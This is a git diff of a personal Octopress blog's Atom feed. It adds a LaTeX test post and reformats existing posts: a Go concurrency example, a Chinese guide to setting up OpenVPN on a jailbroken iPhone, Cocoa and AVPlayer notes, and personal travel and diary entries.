@@ -4,7 +4,7 @@
   <title><![CDATA[ChandleWEi's Blog]]></title>
   <link href="http://ChandleWEi.github.io/atom.xml" rel="self"/>
   <link href="http://ChandleWEi.github.io/"/>
-  <updated>2014-02-17T12:51:33+08:00</updated>
+  <updated>2014-02-17T14:08:06+08:00</updated>
   <id>http://ChandleWEi.github.io/</id>
   <author>
     <name><![CDATA[Chandler Wei]]></name>
@@ -12,6 +12,20 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Latex Test]]></title>
+    <link href="http://ChandleWEi.github.io/blog/2014/02/17/latex-test/"/>
+    <updated>2014-02-17T14:05:17+08:00</updated>
+    <id>http://ChandleWEi.github.io/blog/2014/02/17/latex-test</id>
+    <content type="html"><![CDATA[<script type="math/tex; mode=display">\forall x \in X, \quad \exists y \leq \epsilon</script>
+
+<script type="math/tex; mode=display">\int_0^\infty \mathrm{e}^{-x}\,\mathrm{d}x</script>
+
+<p><script type="math/tex">\sum_{i=1}^{10} t_i</script>
+<script type="math/tex">\sum_{i=1}^{10} t_i</script></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Go Wait Example]]></title>
@@ -25,52 +39,53 @@
 <pre><code>package main
 
 import (
-    "fmt"
-    "io/ioutil"
-    "log"
-    "net/http"
-    "sync"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
+	"sync"
 )
 
 func main() {
-    urls := []string{
-        "http://www.reddit.com/r/aww.json",
-        "http://www.reddit.com/r/funny.json",
-        "http://www.reddit.com/r/programming.json",
-    }
-    jsonResponses := make(chan string)
+	urls := []string{
+		"http://www.reddit.com/r/aww.json",
+		"http://www.reddit.com/r/funny.json",
+		"http://www.reddit.com/r/programming.json",
+	}
+	jsonResponses := make(chan string)
 
-    var wg sync.WaitGroup
+	var wg sync.WaitGroup
 
-    wg.Add(len(urls))
+	wg.Add(len(urls))
 
-    for _, url := range urls {
-        go func(url string) {
-            defer wg.Done()
-            res, err := http.Get(url)
-            if err != nil {
-                log.Fatal(err)
-            } else {
-                defer res.Body.Close()
-                body, err := ioutil.ReadAll(res.Body)
-                if err != nil {
-                    log.Fatal(err)
-                } else {
-                    jsonResponses &lt;- string(body)
-                }
-            }
-        }(url)
-    }
+	for _, url := range urls {
+		go func(url string) {
+			defer wg.Done()
+			res, err := http.Get(url)
+			if err != nil {
+				log.Fatal(err)
+			} else {
+				defer res.Body.Close()
+				body, err := ioutil.ReadAll(res.Body)
+				if err != nil {
+					log.Fatal(err)
+				} else {
+					jsonResponses &lt;- string(body)
+				}
+			}
+		}(url)
+	}
 
-    go func() {
-        for response := range jsonResponses {
-            fmt.Println(response)
-        }
-    }()
+	go func() {
+		for response := range jsonResponses {
+			fmt.Println(response)
+		}
+	}()
 
-    wg.Wait()
+	wg.Wait()
 }
 </code></pre>
+
 ]]></content>
   </entry>
   
@@ -88,13 +103,13 @@ func main() {
     <link href="http://ChandleWEi.github.io/blog/2011/06/01/%5B%E8%BD%AC%EF%BC%BDiphone_openvpn/"/>
     <updated>2011-06-01T12:41:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/06/01/[转］iphone_openvpn</id>
-    <content type="html"><![CDATA[<h2>May 20, 2010</h2>
+    <content type="html"><![CDATA[<h2 id="may-20-2010">May 20, 2010</h2>
 
-<h3><a href="http://fang.gfw.io/2010/05/20/iphone_openvpn_guide/">越狱iPhone / iPad安装OpenVPN小指南</a></h3>
+<h3 id="iphone--ipadopenvpnhttpfanggfwio20100520iphoneopenvpnguide"><a href="http://fang.gfw.io/2010/05/20/iphone_openvpn_guide/">越狱iPhone / iPad安装OpenVPN小指南</a></h3>
 
 <p>Filed under: <a href="http://fang.gfw.io/category/ios/" title="View all posts in iOS">iOS</a>, <a href="http://fang.gfw.io/category/iphoneos/" title="View all posts in iPhoneOS">iPhoneOS</a> — 皇城老爹 @ 11:07</p>
 
-<p><a href="http://fang.gfw.io/wp-content/uploads/iPhone-3GS-212_cr.jpg"> <img src="http://fang.gfw.io/wp-content/uploads/iPhone-3GS-212_cr.jpg" title="OpenVPN Toggle in SBSettings" alt="" /> </a></p>
+<p><a href="http://fang.gfw.io/wp-content/uploads/iPhone-3GS-212_cr.jpg"> <img src="http://fang.gfw.io/wp-content/uploads/iPhone-3GS-212_cr.jpg" alt="" title="OpenVPN Toggle in SBSettings" /> </a></p>
 
 <p>图中可见SBSettings加上OpenVPN Toggle的效果，旁边的VPN Toggle是用来切换iPhone自带VPN的。</p>
 
@@ -103,33 +118,44 @@ func main() {
 <p>主要步骤如下：</p>
 
 <ol>
-<li><p>先下载两个.deb安装包：<br/>
-(1) <a href="http://apt.saurik.com/cydia/debs/">http://apt.saurik.com/cydia/debs/</a><br/>
-下载libpcap_1.0.0-4_iphoneos-arm.deb<br/>
-(2) <a href="http://github.com/jfx2006/OpenVPN_iphone/downloads">http://github.com/jfx2006/OpenVPN_iphone/downloads</a><br/>
-下载里面日期最新的release，例如目前最新版本是openvpn_2.1_rc22_iphone_1-jfx3_iphoneos-arm.deb</p></li>
-<li><p>用WinSCP或者其他SSH工具登录到iPhone/iPad上(你的iPhone/iPad要先安装OpenSSH，为了安全，也请确认修改过root密码），把刚才的两个.deb安装包拷贝到一个临时目录，比如/tmp下面。</p></li>
-<li><p>用Putty或者类似工具登录iPhone/iPad，在命令行使用下面的命令安装刚才放上去的两个.deb包：<br/>
-cd /tmp<br/>
-dpkg -i libpcap_1.0.0-4_iphoneos-arm.deb<br/>
-dpkg -i openvpn_2.1_rc22_iphone_1-jfx3_iphoneos-arm.deb</p></li>
-<li><p>进入Cydia，如果没装过SBSettings，先安装之。然后搜索OpenVPN toggle for SBSettings并安装。在SBSettings里面进入More/Set Toggles，把刚才新装的OpenVPN toggle打开，退出，系统会自动respring。</p></li>
-<li><p>准备好你使用的VPN服务的一套设置文件，包括conf.ovpn设置和证书文件等，用WinSCP传到/private/var/mobile /Library/OpenVpn/ 里面。有必要的话，conf.ovpn设置中有关证书文件路径的行要编辑一下，指向上面的路径。</p></li>
-<li><p>用WinSCP进入/private/var/mobile/Library/SBSettings/Commands/，编辑 com.offinf.openvpndown这个文件，把其中第三行前面加上一个半角的#号注释掉该行；(根据我自己的经验，如果不进行上面这一 步，SBSettings里面刚才添加的OpenVPN Toggle的图标有可能在respring或者重启后不能保存，还得重新添加）</p></li>
+  <li>
+    <p>先下载两个.deb安装包：<br />
+(1) <a href="http://apt.saurik.com/cydia/debs/">http://apt.saurik.com/cydia/debs/</a><br />
+下载libpcap_1.0.0-4_iphoneos-arm.deb<br />
+(2) <a href="http://github.com/jfx2006/OpenVPN_iphone/downloads">http://github.com/jfx2006/OpenVPN_iphone/downloads</a><br />
+下载里面日期最新的release，例如目前最新版本是openvpn_2.1_rc22_iphone_1-jfx3_iphoneos-arm.deb</p>
+  </li>
+  <li>
+    <p>用WinSCP或者其他SSH工具登录到iPhone/iPad上(你的iPhone/iPad要先安装OpenSSH，为了安全，也请确认修改过root密码），把刚才的两个.deb安装包拷贝到一个临时目录，比如/tmp下面。</p>
+  </li>
+  <li>
+    <p>用Putty或者类似工具登录iPhone/iPad，在命令行使用下面的命令安装刚才放上去的两个.deb包：<br />
+cd /tmp<br />
+dpkg -i libpcap_1.0.0-4_iphoneos-arm.deb<br />
+dpkg -i openvpn_2.1_rc22_iphone_1-jfx3_iphoneos-arm.deb</p>
+  </li>
+  <li>
+    <p>进入Cydia，如果没装过SBSettings，先安装之。然后搜索OpenVPN toggle for SBSettings并安装。在SBSettings里面进入More/Set Toggles，把刚才新装的OpenVPN toggle打开，退出，系统会自动respring。</p>
+  </li>
+  <li>
+    <p>准备好你使用的VPN服务的一套设置文件，包括conf.ovpn设置和证书文件等，用WinSCP传到/private/var/mobile /Library/OpenVpn/ 里面。有必要的话，conf.ovpn设置中有关证书文件路径的行要编辑一下，指向上面的路径。</p>
+  </li>
+  <li>
+    <p>用WinSCP进入/private/var/mobile/Library/SBSettings/Commands/，编辑 com.offinf.openvpndown这个文件，把其中第三行前面加上一个半角的#号注释掉该行；(根据我自己的经验，如果不进行上面这一 步，SBSettings里面刚才添加的OpenVPN Toggle的图标有可能在respring或者重启后不能保存，还得重新添加）</p>
+  </li>
 </ol>
 
-
-<p>编辑com.offinf.openvpnup这个文件，第三行建议改成如下内容：<br/>
+<p>编辑com.offinf.openvpnup这个文件，第三行建议改成如下内容：<br />
 /usr/bin/openvpn-iphone –script-security 2 –config /var/mobile/Library/OpenVpn/conf.ovpn &amp;</p>
 
 <p>另外上面一行里面的conf.ovpn的地方如果你的配置文件不是这个名字，要相应改成正确的。</p>
 
 <ol>
-<li>可以考虑把iPhone/iPad所用网络连接的DNS指向类似8.8.8.8或者OpenDNS的服务器。</li>
+  <li>可以考虑把iPhone/iPad所用网络连接的DNS指向类似8.8.8.8或者OpenDNS的服务器。</li>
 </ol>
 
-
 <p>保险起见，重启一下iPhone / iPad，然后用SBSettings里面的OpenVPN toggle，打开，看看是否可以正常使用了？</p>
+
 ]]></content>
   </entry>
   
@@ -139,19 +165,18 @@ dpkg -i openvpn_2.1_rc22_iphone_1-jfx3_iphoneos-arm.deb</p></li>
     <updated>2011-05-24T15:52:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/05/24/avplayer</id>
     <content type="html"><![CDATA[<ol>
-<li>AVPlayer can play from AVPlayerItem using AVURLAsset with an iPod library url. The AVAudioPlayer cannot play from an iPod library url.  </li>
-<li></li>
+  <li>AVPlayer can play from AVPlayerItem using AVURLAsset with an iPod library url. The AVAudioPlayer cannot play from an iPod library url.  </li>
+  <li></li>
 </ol>
-
 
 <p>AVPlayer has no volume property and requires the use of the system volume setting which can be controlled only by the hardware switch or an MPVolumeView. But you can set the mix volume of AVAudioPlayer.</p>
 
 <ol>
-<li></li>
+  <li></li>
 </ol>
 
-
 <p>AVPlayer seems to report an incorrect currentTime after seeking. But AVAudioPlayer reports accurately.</p>
+
 ]]></content>
   </entry>
   
@@ -166,22 +191,22 @@ dpkg -i openvpn_2.1_rc22_iphone_1-jfx3_iphoneos-arm.deb</p></li>
 
 <p><strong> </strong></p>
 
-<p>**The host object is generally an “off-the-shelf” framework object (such as an NSWindow or NSXMLParser object) that is seeking to accomplish something, but can only do so in a generic fashion. The delegate, which is almost always an instance of a custom class, acts in coordination with the host object, supplying  program- specific behavior at certain points in the task ( see Figure 4-3). Thus delegation makes it possible to modify or extend the behavior of another objec<br/>
-这个主对象基本上就是一个现场的框架对象（类似于NS窗口或者NSXML分析程序对象）来争取完成某项任务，但是这种方式只能在一般性的改变当中实现。授权，就是基本上总是比如一个风格的类在与主对象的协调过程中的动作，代理那些在某种意义上以程序区分的在任务里的行为（详见图表4-3）<br/>
-Delegation, in the simple sense of one object delegating a task to another object, is a common technique in object-oriented programming. However, Cocoa implements delegation in a unique way. A host class uses a formal protocol or an informal protocol to define an interface that the delegate object may choose to implement. All the methods in the informal protocol are optional, and the formal protocol may declare optional methods, allowing the delegate to implement only some of the methods in the protocol. Before it attempts to send a message to its delegate, the host object determines whether it implements the method (via a respondsToSelector: message) to avoid runtime exceptions. For more on formal and informal protocols, see “Protocols.”<br/>
-授权，在简单意义上来说，主对象授权一个任务给另外一个对象，就是一个面向对象的程序设计里面的普通技术。然而，Cocoa实现授权是以另外一种独特的方式。一个主类使用一个正式的协议，或者一个非正式的协议去定义一个授权对象可能选择的实现的接口或者界面。所有那些在非正式的协议<br/>
-Some classes in the Cocoa frameworks also send messages to their data sources. A data source is identical in all respects to a delegate, except that the intent is to provide the host object with data to populate a browser, a table view, or similar user-interface view. A data source, unlike a delegate, may also be required to implement some methods of the protocol.</p>
+<p>**The host object is generally an “off-the-shelf” framework object (such as an NSWindow or NSXMLParser object) that is seeking to accomplish something, but can only do so in a generic fashion. The delegate, which is almost always an instance of a custom class, acts in coordination with the host object, supplying  program- specific behavior at certain points in the task ( see Figure 4-3). Thus delegation makes it possible to modify or extend the behavior of another objec<br />
+这个主对象基本上就是一个现场的框架对象（类似于NS窗口或者NSXML分析程序对象）来争取完成某项任务，但是这种方式只能在一般性的改变当中实现。授权，就是基本上总是比如一个风格的类在与主对象的协调过程中的动作，代理那些在某种意义上以程序区分的在任务里的行为（详见图表4-3）<br />
+Delegation, in the simple sense of one object delegating a task to another object, is a common technique in object-oriented programming. However, Cocoa implements delegation in a unique way. A host class uses a formal protocol or an informal protocol to define an interface that the delegate object may choose to implement. All the methods in the informal protocol are optional, and the formal protocol may declare optional methods, allowing the delegate to implement only some of the methods in the protocol. Before it attempts to send a message to its delegate, the host object determines whether it implements the method (via a respondsToSelector: message) to avoid runtime exceptions. For more on formal and informal protocols, see “Protocols.”<br />
+授权，在简单意义上来说，主对象授权一个任务给另外一个对象，就是一个面向对象的程序设计里面的普通技术。然而，Cocoa实现授权是以另外一种独特的方式。一个主类使用一个正式的协议，或者一个非正式的协议去定义一个授权对象可能选择的实现的接口或者界面。所有那些在非正式的协议<br />
+Some classes in the Cocoa frameworks also send messages to their data sources. A data source is identical in all respects to a delegate, except that the intent is to provide the host object with data to populate a browser, a table view, or similar user-interface view. A data source, unlike a delegate, may also be required to implement some methods of the protocol.  </p>
 
-<p>Delegation is not a strict implementation of the Decorator pattern. The host (delegating) object does not wrap an instance of the class it wants to extend; indeed, it’s the other way around, in that the delegate is specializing the behavior of the delegating framework class. There is no sharing of interface either, other than the delegation methods declared by the framework class.</p>
+<p>Delegation is not a strict implementation of the Decorator pattern. The host (delegating) object does not wrap an instance of the class it wants to extend; indeed, it’s the other way around, in that the delegate is specializing the behavior of the delegating framework class. There is no sharing of interface either, other than the delegation methods declared by the framework class.  </p>
 
-<p>Delegation in Cocoa is also part of the Template Method pattern (“Template Method”).<br/>
-Uses and Limitations</p>
+<p>Delegation in Cocoa is also part of the Template Method pattern (“Template Method”).<br />
+Uses and Limitations  </p>
 
-<p>Delegation is a common design in the Cocoa frameworks. Many classes in the AppKit and UIKit frameworks send messages to delegates, including NSApplication, UIApplication, UITableView, and several subclasses of NSView. Some classes in the Foundation framework, such as NSXMLParser and NSStream, also maintain delegates. You should always use a class’s delegation mechanism instead of subclassing the class, unless the delegation methods do not allow you to accomplish your goal.</p>
+<p>Delegation is a common design in the Cocoa frameworks. Many classes in the AppKit and UIKit frameworks send messages to delegates, including NSApplication, UIApplication, UITableView, and several subclasses of NSView. Some classes in the Foundation framework, such as NSXMLParser and NSStream, also maintain delegates. You should always use a class’s delegation mechanism instead of subclassing the class, unless the delegation methods do not allow you to accomplish your goal.  </p>
 
-<p>Although you can dynamically change the delegate, only one object can be a delegate at a time. Thus if you want multiple objects to be informed of a particular program event at the same time, you cannot use delegation. However, you can use the notification mechanism for this purpose. A delegate automatically receives notifications from its delegating framework object as long as the delegate implements one or more of the notification methods declared by the framework class. See the discussion of notifications in the Observer pattern (“Observer”).</p>
+<p>Although you can dynamically change the delegate, only one object can be a delegate at a time. Thus if you want multiple objects to be informed of a particular program event at the same time, you cannot use delegation. However, you can use the notification mechanism for this purpose. A delegate automatically receives notifications from its delegating framework object as long as the delegate implements one or more of the notification methods declared by the framework class. See the discussion of notifications in the Observer pattern (“Observer”).  </p>
 
-<p>Delegating objects in AppKit do not retain their delegates or data sources. See “Ownership of Delegates, Observers, and Targets” for further information.</p>
+<p>Delegating objects in AppKit do not retain their delegates or data sources. See “Ownership of Delegates, Observers, and Targets” for further information.  </p>
 
 <p>**</p>
 ]]></content>
@@ -193,7 +218,7 @@ Uses and Limitations</p>
     <updated>2011-05-02T21:41:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/05/02/apple_文档学习</id>
     <content type="html"><![CDATA[<ol>
-<li>cocoa fundamentals guide # cocoa design patterns 2011年5月2日</li>
+  <li>cocoa fundamentals guide # cocoa design patterns 2011年5月2日</li>
 </ol>
 
 ]]></content>
@@ -235,27 +260,28 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/21/Chandle_%E6%83%85%E8%AF%9Drecord2/"/>
     <updated>2011-04-21T00:24:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/21/Chandle_情话record2</id>
-    <content type="html"><![CDATA[<p>昨天和今天，你说了两遍：亲亲，我们永远在一起&hellip;</p>
+    <content type="html"><![CDATA[<p>昨天和今天，你说了两遍：亲亲，我们永远在一起…</p>
 
-<p>甜言蜜语虽然有时候并不那么可靠，可这却是我现在的精神食粮&hellip;</p>
+<p>甜言蜜语虽然有时候并不那么可靠，可这却是我现在的精神食粮…</p>
 
-<p>有情时知足 无情时莫哭&hellip;记录这些只是为了保存曾经的这些有过的片刻&hellip;</p>
+<p>有情时知足 无情时莫哭…记录这些只是为了保存曾经的这些有过的片刻…</p>
 
-<p>只是并非修炼到圣贤的我，在你说你很烦的时候，我何尝不是感同身受的烦躁&hellip;.</p>
+<p>只是并非修炼到圣贤的我，在你说你很烦的时候，我何尝不是感同身受的烦躁….</p>
 
-<p>我烦躁你的英文始终没提高，担心你的技术进步慢，心疼你的前额头发渐渐减少，忧虑自己未来无法分身陪伴你和家庭&hellip;</p>
+<p>我烦躁你的英文始终没提高，担心你的技术进步慢，心疼你的前额头发渐渐减少，忧虑自己未来无法分身陪伴你和家庭…</p>
 
-<p>我不怕我们未来赚不到钱，我觉得这是最简单的问题&hellip;因为我们总是在正向螺旋曲线向上攀行，经济只是最简单的问题，因为这是可以通过努力和坚持获得收益的&hellip;</p>
+<p>我不怕我们未来赚不到钱，我觉得这是最简单的问题…因为我们总是在正向螺旋曲线向上攀行，经济只是最简单的问题，因为这是可以通过努力和坚持获得收益的…</p>
 
-<p>痛苦的是那些二十年来我与生俱来的窘迫条件，像定时炸弹悬在我们头顶，让本来迷雾之中的未来更添一份凶险，而我们还对未来更多的预警束手无策&hellip;生小孩，带小孩，未来我父母的生老病死&hellip;这些俗世的负债，让我们太累太累&hellip;.</p>
+<p>痛苦的是那些二十年来我与生俱来的窘迫条件，像定时炸弹悬在我们头顶，让本来迷雾之中的未来更添一份凶险，而我们还对未来更多的预警束手无策…生小孩，带小孩，未来我父母的生老病死…这些俗世的负债，让我们太累太累….</p>
 
-<p>自私的人才能自由&hellip;可惜我们都不够自私，所以我们都是生活的囚徒而已&hellip;</p>
+<p>自私的人才能自由…可惜我们都不够自私，所以我们都是生活的囚徒而已…</p>
 
-<p>明知道想太多无济于事，还是在今天的心情下忍不住发泄到这里了&hellip;</p>
+<p>明知道想太多无济于事，还是在今天的心情下忍不住发泄到这里了…</p>
 
-<p>我们那么热爱生活，为什么不能获得接纳&hellip;</p>
+<p>我们那么热爱生活，为什么不能获得接纳…</p>
 
-<p>唉&hellip;我等你，你随意&hellip;我也只有这点挥霍的权利吧&hellip;</p>
+<p>唉…我等你，你随意…我也只有这点挥霍的权利吧…</p>
+
 ]]></content>
   </entry>
   
@@ -266,7 +292,8 @@ Uses and Limitations</p>
     <id>http://ChandleWEi.github.io/blog/2011/04/19/Chandle_情话record1</id>
     <content type="html"><![CDATA[<p>某人今天说：</p>
 
-<p>拿到疯4没有很开心，可以郊游没有很开心，写程序也不见得开心，打游戏也没特别开心，倒是那啥啥啥在我旁边，一起走走路说说话感觉特别开心&hellip;.</p>
+<p>拿到疯4没有很开心，可以郊游没有很开心，写程序也不见得开心，打游戏也没特别开心，倒是那啥啥啥在我旁边，一起走走路说说话感觉特别开心….</p>
+
 ]]></content>
   </entry>
   
@@ -275,24 +302,25 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/18/%E5%8E%A6%E9%97%A83/"/>
     <updated>2011-04-18T15:48:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/18/厦门3</id>
-    <content type="html"><![CDATA[<p>现在写东西很慢啊.一点都不像当年的我&hellip;因为很久没写长文字,刚打开页面的时候文思如泉涌，写着写着就歇菜了&hellip;</p>
+    <content type="html"><![CDATA[<p>现在写东西很慢啊.一点都不像当年的我…因为很久没写长文字,刚打开页面的时候文思如泉涌，写着写着就歇菜了…</p>
 
-<p>哎，很崩溃的感觉&hellip;</p>
+<p>哎，很崩溃的感觉…</p>
 
-<p>其实厦门3天确实是我们俩2年半里最成功的一次远途旅行了，每天的满足感都在递进式增长。回来之后回味无穷，哎&hellip;还特此制定短、中、长期旅游计划&hellip;</p>
+<p>其实厦门3天确实是我们俩2年半里最成功的一次远途旅行了，每天的满足感都在递进式增长。回来之后回味无穷，哎…还特此制定短、中、长期旅游计划…</p>
 
 <p>最近你给我看张小砚台的书，让我对旅游的认识更加多了一层向往，以前只觉得旅游就是玩，就是看风景，拍照片，现在看了别人的生活经历，才开始觉得自己在现世广袤的生活里，蜷缩在偏安一隅的角落里，活的认认真真，辛辛苦苦，其实毫无乐趣可言。什么工资啊、结婚啊，在自由的生活态度面前，真是不堪一击，就和一个穿得冠冕堂皇实际内心枯竭的小子站在穿着乞丐装的小王子面前一样。</p>
 
-<p>你的生活有多重？<br/>
-一部电影叫《在云端》，里面提到的一个问题。<br/>
-“想象一下你背着一个背包，背带勒在肩膀上。现在，把生活中所有的东西都塞到包里。从小件开始，比如书架里，抽屉里的，小玩意，收藏品。感觉这些东西的重量。然后，开始收拾大件的。衣服，桌上电器，台灯，毛巾，电视……背包现在已经相当重了。接着收拾更大的。沙发，床，餐桌，全都放进去。车也放进去，还有你的房子……全都塞进背包里。现在，试着走两步。很困难吧？”<br/>
+<p>你的生活有多重？<br />
+一部电影叫《在云端》，里面提到的一个问题。<br />
+“想象一下你背着一个背包，背带勒在肩膀上。现在，把生活中所有的东西都塞到包里。从小件开始，比如书架里，抽屉里的，小玩意，收藏品。感觉这些东西的重量。然后，开始收拾大件的。衣服，桌上电器，台灯，毛巾，电视……背包现在已经相当重了。接着收拾更大的。沙发，床，餐桌，全都放进去。车也放进去，还有你的房子……全都塞进背包里。现在，试着走两步。很困难吧？”<br />
 这就是我们每天做的事情。我们不断给自己增重，直到寸步难行。然而，行动就是生命。</p>
 
 <p>我们那么认真的活着，积极的也罢，消极的被迫的也罢，终究只是为了一些别人眼里的认可，只有旅游，才是真正愉悦自己的经历吧。不必强求，不必谄媚。</p>
 
-<p>那么决定解放，即使只是暂时的解放，因为现实总是有更多比释放自我更”“重要的事情”，重要与否其实只是你内心的偏向而已，我们总是对自由有种莫名的强烈向往，但是越是自由，就越是意味着无限可能，无限可能既是不确定，不确定就缺乏安全感。既要冒险又想安全感，大多数人就在这种矛盾的心情中不做改变的活了一辈子吧。我们不可能放弃工作，不可能放弃亲情的羁绊，不可能放弃名利与曾经几十年奋斗的结果。不过，人不能放弃尝试的可能，哪怕只是一瞬间&hellip;所以那么多人如此着迷旅行的意义&hellip;.</p>
+<p>那么决定解放，即使只是暂时的解放，因为现实总是有更多比释放自我更”“重要的事情”，重要与否其实只是你内心的偏向而已，我们总是对自由有种莫名的强烈向往，但是越是自由，就越是意味着无限可能，无限可能既是不确定，不确定就缺乏安全感。既要冒险又想安全感，大多数人就在这种矛盾的心情中不做改变的活了一辈子吧。我们不可能放弃工作，不可能放弃亲情的羁绊，不可能放弃名利与曾经几十年奋斗的结果。不过，人不能放弃尝试的可能，哪怕只是一瞬间…所以那么多人如此着迷旅行的意义….</p>
 
-<p>旅行就是要从自己活腻了的地方到别人活腻了地方去。人一辈子，小小足迹能涉及的范围与茫茫宇宙相比，该是多渺小啊&hellip;有生之年，我应该去哪儿呢？</p>
+<p>旅行就是要从自己活腻了的地方到别人活腻了地方去。人一辈子，小小足迹能涉及的范围与茫茫宇宙相比，该是多渺小啊…有生之年，我应该去哪儿呢？</p>
+
 ]]></content>
   </entry>
   
@@ -303,17 +331,17 @@ Uses and Limitations</p>
     <id>http://ChandleWEi.github.io/blog/2011/04/17/厦门2</id>
     <content type="html"><![CDATA[<p>上次写了鼓浪屿的第一天</p>
 
-<p>隔了很长时间，心心念念的全都是厦门的美景和放飞的心情，每天工作闲暇之余都回味无穷，翻照片，看当时记录的视频，这番心情不记录下来，姑娘我真是会遗憾到死&hellip;.</p>
+<p>隔了很长时间，心心念念的全都是厦门的美景和放飞的心情，每天工作闲暇之余都回味无穷，翻照片，看当时记录的视频，这番心情不记录下来，姑娘我真是会遗憾到死….</p>
 
 <p>Day2:</p>
 
 <p>南普陀寺、厦门大学、鼓浪屿右侧</p>
 
-<p>昨夜美美的睡了一觉，ChandleWEi说这是迄今为止我和他出来旅游睡得最好的一觉&hellip;.偶&hellip;其实我老老实实睡觉还是很乖的，而且注意控制了晚上喝水的频次，没有在四五点起来上厕所扰某人清梦~~哈哈，早上醒来，拉开窗帘，外面还是有点灰，不过已经开始依稀透着一点蓝，比昨天好，我们彼此安慰~~~</p>
+<p>昨夜美美的睡了一觉，ChandleWEi说这是迄今为止我和他出来旅游睡得最好的一觉….偶…其实我老老实实睡觉还是很乖的，而且注意控制了晚上喝水的频次，没有在四五点起来上厕所扰某人清梦~~哈哈，早上醒来，拉开窗帘，外面还是有点灰，不过已经开始依稀透着一点蓝，比昨天好，我们彼此安慰~~~</p>
 
 <p>洗漱，出门，哈哈，有太阳~~4月初春，早上还有点凉意，因为感冒也不能风骚的穿小裙子，只有一条彩色的小背带裙，裹在厚厚的外套里面，这个季节里，厦门的太阳和上海有点点不同，是透明的，是轻柔的，是抚摸皮肤的温柔阳光~~~</p>
 
-<p>stop1：吃早餐，环岛路沙滩上遛遛~~专门问了房东姐姐，说曾厝垵村子里的早餐很多的，果然出门往村里一走就发现很多小店，装修朴素，店招都清一色写着：沙茶面、面线糊之类的厦门风情的小食，店主也不会主动上来揽客，进门随意，即使只是看看就走也尽情随意。不过这边很多店都打着福建沙县小吃的招牌，Chandle一时很难接受，他每天在上海中午上班就为了便宜常常不得不吃沙县，见到这个招牌就恶心。哈哈。不过入乡随俗，福建的小吃在福建吃，风味总有不同吧，我们挑了一家没有沙县的名头的小店，进去犹豫了半天只点了一份面线糊，哈哈，Chandle吃了一根油条&hellip;</p>
+<p>stop1：吃早餐，环岛路沙滩上遛遛~~专门问了房东姐姐，说曾厝垵村子里的早餐很多的，果然出门往村里一走就发现很多小店，装修朴素，店招都清一色写着：沙茶面、面线糊之类的厦门风情的小食，店主也不会主动上来揽客，进门随意，即使只是看看就走也尽情随意。不过这边很多店都打着福建沙县小吃的招牌，Chandle一时很难接受，他每天在上海中午上班就为了便宜常常不得不吃沙县，见到这个招牌就恶心。哈哈。不过入乡随俗，福建的小吃在福建吃，风味总有不同吧，我们挑了一家没有沙县的名头的小店，进去犹豫了半天只点了一份面线糊，哈哈，Chandle吃了一根油条…</p>
 
 <p>吃完我提议在小村子里走走，昨天进村子的时候看到一拨人 明明走在我们后面，但是等我们到达旅馆的时候他们竟然神奇的朝我们迎面走来，当时我就觉得这小村子的道路必有玄机，今天一定要走一番，果然不负所望，村子的左侧-右侧我们昨天是从外部绕的，其实里面的小弄堂可以横穿，小弄堂窄的地方仅容一人通过，路边不时有布置精心的小院落，估计都是为游客准备的小家庭旅馆，方方的院子里，木质的栅栏，摆上几盆绿植，外露式的小楼阶梯，从一楼延伸到3、4楼，小楼都不超过5层楼，互相不遮掩，楼顶都有空旷的阳台，也是摆满了开着小花的素净的植物，随意的摆放也情调非凡。</p>
 
@@ -323,37 +351,38 @@ Uses and Limitations</p>
 
 <p>环岛路上晃一圈：</p>
 
-<p>昨天打车到旅馆的时候经过环岛路，就知道一定要下来走一走，今天终于悠闲了&hellip;我们拣了一个陡峭的入口进入沙滩的范畴，还鼓着you jump I jump的大义凛然的决心才先后跳下去&hellip;后来发现十步以外就有个阶梯可以直接到沙滩&hellip;.傻死啦~~~</p>
+<p>昨天打车到旅馆的时候经过环岛路，就知道一定要下来走一走，今天终于悠闲了…我们拣了一个陡峭的入口进入沙滩的范畴，还鼓着you jump I jump的大义凛然的决心才先后跳下去…后来发现十步以外就有个阶梯可以直接到沙滩….傻死啦~~~</p>
 
-<p>时间隔得太久，几乎都忘了第一眼看到大海的时候是什么感觉了&hellip;.哎，可惜&hellip;我在秦皇岛也看到过冰海..那是冬天冻得毫无生气的一片海&hellip;水倒是干干净净，但是旁边都是工业城市的冷肃之气，完全没有厦门植被葱茏的海滨小城的风味。</p>
+<p>时间隔得太久，几乎都忘了第一眼看到大海的时候是什么感觉了….哎，可惜…我在秦皇岛也看到过冰海..那是冬天冻得毫无生气的一片海…水倒是干干净净，但是旁边都是工业城市的冷肃之气，完全没有厦门植被葱茏的海滨小城的风味。</p>
 
-<p>那天的天气，有点小小的阳光，不过并不透彻，不过看到一片茫茫大海，满耳全是海水拍打沙滩的声音的时候，又是心中有爱的时候，这一切总归是美的。看到海浪一波波往沙滩上冲刷，情不自禁想和大海来个亲密接触，于是试探着探出我的小红鞋去踩浪花，哈哈，这一试，果然就中招了&hellip;.海水远远看起来平静，有规律，当人站在水与沙的边缘，以为水每次的拍打都是相同节奏相同强度的时候，大海就会使出她调皮的本性，突然嬉皮笑脸的一个猛冲，小小一个玩笑，沾湿你的鞋子和袜子<del>于是我就在大海的小小伎俩中中招了&hellip;小红鞋和袜子一次性湿透透&hellip;湿了倒好，哈哈，成全我的天性，提着鞋子更加放肆的冲进大海，不过，终究还是因为不会游泳还是止步于浅滩</del>遥望远处有汽艇，疾驰在遥远的海平面上，突然望洋兴叹&hellip;.自由的快感与搏命的风险是共存的啊&hellip;.我还是老老实实在沙滩上走着吧&hellip;</p>
